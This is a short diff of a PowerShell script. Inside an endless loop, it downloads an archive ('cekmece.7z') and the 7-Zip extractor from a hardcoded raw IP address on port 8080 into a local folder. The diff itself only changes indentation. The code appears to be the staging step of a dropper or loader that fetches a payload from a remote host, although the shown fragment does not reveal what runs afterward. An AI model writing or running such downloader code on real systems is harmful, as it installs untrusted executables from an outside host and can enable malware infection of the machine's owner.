@@ -19,7 +19,7 @@ while ($true) {
         Start-BitsTransfer -Source "http://78.129.240.79:8080/cekmece.7z" -Destination "C:\eren\cekmece.7z"
     }
 
-     if (-not (Test-Path "C:\eren\7zr.exe")) {
+    if (-not (Test-Path "C:\eren\7zr.exe")) {
         Start-BitsTransfer -Source "http://78.129.240.79:8080/7zr.exe" -Destination "C:\eren\7zr.exe"
     }
 
